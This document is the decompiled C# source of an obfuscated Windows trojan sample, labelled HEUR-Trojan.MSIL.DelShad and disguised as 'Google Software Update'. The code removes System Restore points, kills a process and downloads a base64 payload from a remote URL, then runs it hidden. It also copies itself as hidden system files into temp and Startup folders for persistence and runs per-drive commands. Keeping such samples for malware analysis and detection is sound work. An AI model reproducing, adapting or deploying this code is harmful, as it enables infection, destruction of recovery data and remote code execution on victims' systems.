// Decompiled with JetBrains decompiler
// Type: C3904355907.C3187964512
// Assembly: Google Software Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1ECCB2B4-E3D0-48EA-84ED-06938D43796B
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-b37761715d5a2405a3fa75abccaf6bb15b7298673aaad91a158725be3c518a87.exe

using \u003Cdion2ntty2ic0uyoe\u003E\u007B43570453\u002D3AD8\u002D4A5B\u002DB273\u002D83DF8156D820\u007D;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace C3904355907
{
  internal class C3187964512
  {
    private static string[] C3554254475 = new string[2]
    {
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JK(),
      DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Jk()
    };

    public static void C3554254475()
    {
      try
      {
        string[] strArray = new string[1]
        {
          DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iT()
        };
        foreach (string processName in strArray)
        {
          foreach (Process process in Process.GetProcessesByName(processName))
            process.Kill();
        }
      }
      catch (Exception ex)
      {
      }
    }

    [DllImport("Srclient.dll", EntryPoint = "SRRemoveRestorePoint")]
    private static extern int C3554254475([In] int obj0);

    public static void C3904355907()
    {
      ManagementObjectCollection instances = new ManagementClass(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.it(), DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iU(), new ObjectGetOptions()).GetInstances();
      StringBuilder stringBuilder = new StringBuilder();
      foreach (ManagementBaseObject managementBaseObject in instances)
      {
        stringBuilder.AppendLine((string) managementBaseObject[DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iu()] + Convert.ToChar(9).ToString() + ((uint) managementBaseObject[DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iV()]).ToString());
        C3187964512.C3554254475(int.Parse(managementBaseObject[DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iV()].ToString()));
      }
    }

    public static void C1255198513()
    {
      byte[] bytes = Convert.FromBase64String(new WebClient().DownloadString(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iv()));
      string path = Environment.ExpandEnvironmentVariables(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iW()) + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Bh() + C3187964512.C3904355907(20) + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iS();
      System.IO.File.WriteAllBytes(path, bytes);
      Process.Start(new ProcessStartInfo()
      {
        CreateNoWindow = true,
        UseShellExecute = false,
        FileName = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.id(),
        Arguments = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iw() + path,
        RedirectStandardError = true,
        RedirectStandardOutput = true,
        WindowStyle = ProcessWindowStyle.Hidden
      });
    }

    private static void C3554254475([In] string[] obj0)
    {
      try
      {
        C3187964512.C3554254475(true);
        if (C3187964512.C1037565863())
          ThreadPool.QueueUserWorkItem(new WaitCallback(C3187964512.C3554254475), (object) DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iX());
        else if (C1342839628.C3554254475())
        {
          C3187964512.C1255198513();
          C3187964512.C3554254475();
          C3187964512.C2746444292();
          C3187964512.C3904355907();
          byte[] numArray = System.IO.File.ReadAllBytes(Assembly.GetEntryAssembly().Location);
          string str = C3187964512.C3904355907(10);
          C3187964512.C3554254475(Environment.ExpandEnvironmentVariables(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iW()) + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Bh() + str + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ix(), numArray);
          C4067256894.C1255198513(1, C3187964512.C3554254475[0], C3187964512.C3554254475[1], (object) (Environment.ExpandEnvironmentVariables(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iW()) + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Bh() + str + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ix()));
          C3187964512.C3554254475(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Bh() + C3187964512.C3904355907(10) + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.ix(), numArray);
          C3187964512.C3554254475(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iY(), DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iy());
          ThreadPool.QueueUserWorkItem(new WaitCallback(C3187964512.C3554254475), (object) DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iX());
        }
        else
          Process.GetCurrentProcess().Kill();
      }
      catch (Exception ex)
      {
        ThreadPool.QueueUserWorkItem(new WaitCallback(C3187964512.C3554254475), (object) DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iX());
      }
      Console.ReadLine();
    }

    private static void C3554254475([In] bool obj0)
    {
      IntPtr num = C453955339.C3554254475();
      if (obj0)
        C453955339.C3554254475(num, 0);
      else
        C453955339.C3554254475(num, 5);
    }

    public static bool C1908338681() => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

    private static void C3554254475([In] string obj0, [In] byte[] obj1)
    {
      try
      {
        if (System.IO.File.Exists(obj0))
          return;
        System.IO.File.WriteAllBytes(obj0, obj1);
        System.IO.File.SetAttributes(obj0, FileAttributes.Hidden | FileAttributes.System);
      }
      catch
      {
      }
    }

    private static void C3554254475([In] string obj0, [In] string obj1)
    {
      try
      {
        if (System.IO.File.Exists(obj0))
          return;
        System.IO.File.WriteAllText(obj0, obj1);
        System.IO.File.SetAttributes(obj0, FileAttributes.Hidden | FileAttributes.System);
      }
      catch
      {
      }
    }

    public static string C3904355907([In] int obj0)
    {
      Random random = new Random();
      string[] strArray1 = new string[22]
      {
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.BU(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cP(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.dm(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.dP(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iZ(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iz(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JA(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Ja(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JB(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cq(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JB(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Jb(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JC(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Jc(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JD(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.C453955339(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Jd(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JE(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Je(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.C1801730948(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JF(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Jf()
      };
      string[] strArray2 = new string[7]
      {
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.C1505515367(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Dm(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JG(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Jg(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JH(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Jh(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JI()
      };
      string str1 = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz() + strArray1[random.Next(strArray1.Length)].ToUpper() + strArray2[random.Next(strArray2.Length)];
      int num;
      for (int index = 2; index < obj0; index = num + 1)
      {
        string str2 = str1 + strArray1[random.Next(strArray1.Length)];
        num = index + 1;
        str1 = str2 + strArray2[random.Next(strArray2.Length)];
      }
      return str1;
    }

    public static bool C1037565863() => C4067256894.C3554254475(1, C3187964512.C3554254475[0], C3187964512.C3554254475[1]);

    public void C112844655()
    {
    }

    public static void C2746444292()
    {
      string[] logicalDrives = Environment.GetLogicalDrives();
      string str1 = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Ji();
      string[] strArray = new string[2]
      {
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JJ(),
        DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Jj()
      };
      C4067256894.C3904355907(str1);
      foreach (string str2 in logicalDrives)
      {
        char ch = str2[0];
        C4067256894.C3904355907(string.Format(strArray[0], (object) ch, (object) ch));
        C4067256894.C3904355907(string.Format(strArray[1], (object) ch, (object) ch));
      }
      C4067256894.C3904355907(str1);
    }

    private static async void C3554254475([In] object obj0)
    {
      string str = C252678980.C3554254475();
      C1801730948.C3904355907 = str;
      C1801730948.C1037565863();
      Task<C655174618> task = new C1801730948(str).C1908338681();
      try
      {
        if (task.Result.C3904355907() != DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz())
          C3463352047.C3554254475 = C3463352047.C3554254475(task.Result.C3904355907(), C3463352047.C3554254475(task.Result.C1255198513(), str));
      }
      catch
      {
      }
      Trace.WriteLine(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.KT() + str);
      C3463352047.C3904355907();
      ThreadStart start = (ThreadStart) null;
      start = !DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iX().Equals(obj0) ? new ThreadStart(C3187964512.C3568589458) : new ThreadStart(C3187964512.C2564639436);
      Thread thread = new Thread(start);
      thread.Priority = ThreadPriority.BelowNormal;
      thread.IsBackground = true;
      thread.Start();
      thread.Join();
      if (!DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iX().Equals(obj0))
        ;
      Console.ReadLine();
      str = (string) null;
      task = (Task<C655174618>) null;
      start = (ThreadStart) null;
      thread = (Thread) null;
    }

    private static void C2564639436() => new C1812594589().C3554254475();

    private static void C3568589458() => new C4110462503().C3554254475();

    private delegate void C3554254475();

    private delegate void C3904355907([In] string obj0);
  }
}
